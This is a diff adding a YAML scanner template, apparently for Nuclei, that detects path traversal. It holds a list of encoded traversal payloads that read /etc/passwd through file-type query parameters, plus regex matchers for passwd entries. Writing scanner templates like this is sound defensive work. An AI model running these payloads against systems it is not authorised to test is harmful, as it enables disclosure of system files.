@@ -1,0 +1,44 @@
+id: path-traversal-advanced
+
+info:
+  name: Path Traversal - Advanced Techniques
+  author: Kalkaneus Team
+  severity: high
+  description: Detects path traversal vulnerabilities using advanced bypass techniques
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+  tags: path-traversal,lfi,file-read
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{Path}}{{Payload}}"
+    
+    payloads:
+      Path:
+        - "?file="
+        - "?path="
+        - "?page="
+        - "?include="
+        - "?doc="
+        - "?document="
+      Payload:
+        - "....//....//....//etc/passwd"
+        - "..%2f..%2f..%2fetc%2fpasswd"
+        - "..%252f..%252f..%252fetc%252fpasswd"
+        - "....\/....\/....\/etc/passwd"
+        - "..%5c..%5c..%5cetc%5cpasswd"
+        - "..;/..;/..;/etc/passwd"
+        - "/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+    
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "daemon:.*:1:1:"
+        condition: or
+        
+      - type: status
+        status:
+          - 200
